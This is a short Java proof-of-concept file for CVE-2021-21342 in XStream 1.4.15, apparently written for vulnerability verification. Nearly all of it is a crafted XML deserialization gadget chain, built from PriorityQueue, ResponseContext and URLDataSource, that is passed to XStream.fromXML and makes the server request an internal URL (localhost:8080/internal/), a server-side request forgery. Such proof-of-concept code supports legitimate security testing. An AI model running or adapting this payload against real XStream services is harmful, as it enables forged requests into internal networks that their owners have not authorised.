package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21342 {
    public static void main(String[] args) {

        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='javax.activation.URLDataSource'>\n" +
                "                <url>http://localhost:8080/internal/</url>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}
